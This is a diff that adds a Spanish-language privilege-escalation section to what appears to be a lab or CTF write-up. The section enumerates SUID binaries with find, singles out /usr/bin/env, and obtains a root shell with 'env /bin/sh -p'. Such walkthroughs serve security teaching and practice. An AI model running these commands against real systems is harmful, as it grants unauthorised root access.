@@ -309,3 +309,64 @@ duque
 ---
 
 Con esto, se logra comprometer completamente el sistema objetivo.
+
+## ⬆️ Escalada de privilegios
+
+Una vez obtenido acceso al sistema como el usuario `duque`, se procedió a buscar posibles vectores para escalar privilegios.
+
+### 🔍 Enumeración de binarios SUID
+
+Se utilizó el siguiente comando para identificar binarios con el bit SUID activado:
+
+```bash id="suidcmd"
+find / -perm -4000 2>/dev/null
+```
+
+### 📊 Resultados
+
+El comando arrojó los siguientes binarios con permisos SUID:
+
+<img width="426" height="238" alt="imagen" src="https://github.com/user-attachments/assets/ea82ee76-af62-44ac-8f35-8b65cd20517b" />
+
+```id="suidlist"
+ /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+ /usr/lib/openssh/ssh-keysign
+ /usr/bin/passwd
+ /usr/bin/env
+ /usr/bin/su
+ /usr/bin/chfn
+ /usr/bin/chsh
+ /usr/bin/mount
+ /usr/bin/newgrp
+ /usr/bin/gpasswd
+ /usr/bin/umount
+ /usr/bin/sudo
+```
+
+### 🧠 Análisis
+
+Entre los binarios encontrados, destacó `/usr/bin/env`, ya que puede ser utilizado para ejecutar comandos con privilegios elevados en ciertos contextos.
+
+---
+
+### ⚔️ Explotación
+
+Investigando posibles métodos de explotación, se identificó (mediante técnicas conocidas documentadas en **GTFOBins**) que el binario `env` puede ser abusado para obtener una shell privilegiada.
+
+<img width="1321" height="594" alt="imagen" src="https://github.com/user-attachments/assets/eccfeefe-b0ce-4418-a824-847ea7d73399" />
+
+Se ejecutó el siguiente comando:
+
+```bash id="exploit"
+env /bin/sh -p
+```
+
+### ✅ Resultado
+
+<img width="315" height="126" alt="imagen" src="https://github.com/user-attachments/assets/2415be45-8bb1-4284-a685-ff8655c20c8c" />
+
+El comando permitió obtener una shell con privilegios de **root**, completando exitosamente la escalada de privilegios.
+
+---
+
+Con esto, se logró el control total del sistema.
